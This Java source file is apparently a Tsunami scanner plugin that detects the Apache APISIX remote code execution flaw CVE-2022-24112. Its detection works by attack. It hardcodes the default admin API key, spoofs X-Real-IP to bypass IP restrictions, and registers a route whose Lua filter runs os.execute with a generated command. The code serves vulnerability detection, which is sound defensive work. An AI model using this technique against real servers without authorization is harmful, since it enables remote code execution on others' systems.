/*
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.rce.cve202224112;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.CONNECTION;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
import static com.google.tsunami.common.net.http.HttpRequest.get;
import static com.google.tsunami.common.net.http.HttpRequest.post;
import static java.nio.charset.StandardCharsets.UTF_8;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.io.Resources;
import com.google.common.util.concurrent.Uninterruptibles;
import com.google.gson.JsonElement;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects Apache APISIX RCE CVE-2022-24112. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "Apache APISIX RCE CVE-2022-24112 Detector",
    version = "0.1",
    description = "This detector checks Apache APISIX RCE (CVE-2022-24112).",
    author = "yuradoc (yuradoc.research@gmail.com)",
    bootstrapModule = Cve202224112DetectorBootstrapModule.class)
public final class Cve202224112Detector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private static final String BATCH_REQUEST_PATH = "apisix/batch-requests";
  private static final int BATCH_REQUEST_WAIT_AFTER_TIMEOUT = 6;
  private static final String DEFAULT_ADMIN_KEY_TOKEN = "edd1c9f034335f136f87ad84b625c8f1";
  private static final String X_REAL_IP_BYPASS = "127.0.0.1";
  private static final String PIPE_REQUEST_PATH = "apisix/admin/routes/tsunami_rce";
  private static final int PIPE_REQUEST_EXPIRE_TTL = 30;
  private static final String PIPE_REQUEST_BODY_URI =
      "tsunami_rce/" + Long.toHexString(Double.doubleToLongBits(Math.random()));
  private static final String PIPE_REQUEST_BODY_NAME =
      Long.toHexString(Double.doubleToLongBits(Math.random()));

  private static final String FILTER_FUNC_OS_RCE =
      "function(vars) os.execute('%s'); return true end";
  private static final String FILTER_FUNC_OS_EXEC =
      "function(vars) return os.execute('echo hello')==true end";
  private static final String FILTER_FUNC_FALSE = "function(vars) return false end";
  private final Clock utcClock;
  private final HttpClient httpClient;

  private final PayloadGenerator payloadGenerator;
  private final String batchRequestBodyTemplate;

  @Inject
  Cve202224112Detector(
      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator)
      throws IOException {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient);
    this.payloadGenerator = checkNotNull(payloadGenerator);
    batchRequestBodyTemplate =
        Resources.toString(Resources.getResource(this.getClass(), "pipeRequestBody.json"), UTF_8);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Cve202224112Detector starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    return (payloadGenerator.isCallbackServerEnabled() && isVulnerableWithCallback(networkService))
        || isVulnerableWithoutCallback(networkService);
  }

  private boolean isVulnerableWithCallback(NetworkService networkService) {
    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.REFLECTIVE_RCE)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
            .setExecutionEnvironment(
                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
            .build();

    Payload payload = payloadGenerator.generate(config);
    String cmd = payload.getPayload();

    String filterFunc = String.format(FILTER_FUNC_OS_RCE, cmd);

    var vulnRouteCreated = registerRouteRequest(networkService, filterFunc);
    if (!vulnRouteCreated) {
      return false;
    }

    Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(BATCH_REQUEST_WAIT_AFTER_TIMEOUT));

    executeCreatedRouteRequest(networkService);

    return payload.checkIfExecuted();
  }

  private boolean isVulnerableWithoutCallback(NetworkService networkService) {
    HttpResponse resp;

    var vulnRouteCreated = registerRouteRequest(networkService, FILTER_FUNC_OS_EXEC);
    if (!vulnRouteCreated) {
      return false;
    }

    Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(BATCH_REQUEST_WAIT_AFTER_TIMEOUT));

    resp = executeCreatedRouteRequest(networkService);
    if (resp == null
        || !(resp.status().code() == HttpStatus.SERVICE_UNAVAILABLE.code()
            || resp.status().code() == HttpStatus.BAD_GATEWAY.code())) {
      return false;
    }

    var trueNegativeRouteCreated = registerRouteRequest(networkService, FILTER_FUNC_FALSE);
    if (!trueNegativeRouteCreated) {
      return false;
    }

    Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(BATCH_REQUEST_WAIT_AFTER_TIMEOUT));

    resp = executeCreatedRouteRequest(networkService);
    return resp != null && resp.status().code() == HttpStatus.NOT_FOUND.code();
  }

  private HttpResponse executeBatchRequest(NetworkService networkService, String filterFunc) {
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);

    HttpHeaders headers =
        HttpHeaders.builder()
            .addHeader("X-API-KEY", DEFAULT_ADMIN_KEY_TOKEN)
            .addHeader(CONTENT_TYPE, "application/json")
            .addHeader(CONNECTION, "close")
            .build();

    String batchRequestBody = this.batchRequestBodyTemplate;
    String[] placeholders = {
      "{{X_REAL_IP}}",
      "{{X_API_KEY}}",
      "{{PIPE_REQ_PATH}}",
      "{{PIPE_REQ_METHOD}}",
      "{{PIPE_REQ_URI}}",
      "{{PIPE_REQ_NAME}}",
      "{{PIPE_REQ_FILTER_FUNC}}"
    };
    String[] replacements = {
      X_REAL_IP_BYPASS,
      DEFAULT_ADMIN_KEY_TOKEN,
      "/" + PIPE_REQUEST_PATH + "?ttl=" + PIPE_REQUEST_EXPIRE_TTL,
      "PUT",
      "/" + PIPE_REQUEST_BODY_URI,
      PIPE_REQUEST_BODY_NAME,
      filterFunc
    };

    for (int i = 0; i < placeholders.length; i++) {
      batchRequestBody = batchRequestBody.replace(placeholders[i], replacements[i]);
    }

    HttpResponse resp = null;
    try {
      resp =
          httpClient.send(
              post(targetUri + BATCH_REQUEST_PATH)
                  .setHeaders(headers)
                  .setRequestBody(ByteString.copyFromUtf8(batchRequestBody))
                  .build(),
              networkService);
    } catch (Exception e) {
      logger.atWarning().log("Failed to send request.");
    }
    return resp;
  }

  private boolean registerRouteRequest(NetworkService networkService, String filterFunc) {
    HttpResponse resp = executeBatchRequest(networkService, filterFunc);

    return resp != null
        && resp.status().code() == HttpStatus.OK.code()
        && resp.bodyJson().isPresent()
        && containsOkStatus(resp.bodyJson().get());
  }

  private boolean containsOkStatus(JsonElement jsonElement) {
    try {
      return jsonElement
          .getAsJsonArray()
          .get(0)
          .getAsJsonObject()
          .get("status")
          .getAsString()
          .matches("200|201");
    } catch (Exception e) {
      logger.atInfo().log("Best effort Json parsing failed for %s.", jsonElement);
    }
    return false;
  }

  private HttpResponse executeCreatedRouteRequest(NetworkService networkService) {
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);

    HttpHeaders headers =
        HttpHeaders.builder()
            .addHeader("X-API-KEY", DEFAULT_ADMIN_KEY_TOKEN)
            .addHeader(CONTENT_TYPE, "application/json")
            .addHeader(CONNECTION, "close")
            .build();

    HttpResponse resp = null;
    try {
      resp =
          httpClient.send(
              get(targetUri + PIPE_REQUEST_BODY_URI).setHeaders(headers).build(), networkService);
    } catch (Exception e) {
      logger.atWarning().log("Failed to send request.");
    }
    return resp;
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE-2022-24112"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("Apache APISIX RCE (CVE-2022-24112)")
                .setDescription(
                    "Some of Apache APISIX 2.x versions allows attacker to"
                        + " bypass IP restrictions of Admin API through the batch-requests plugin."
                        + " A default configuration of Apache APISIX (with default API key) is"
                        + " vulnerable to remote code execution through the plugin."))
        .build();
  }
}

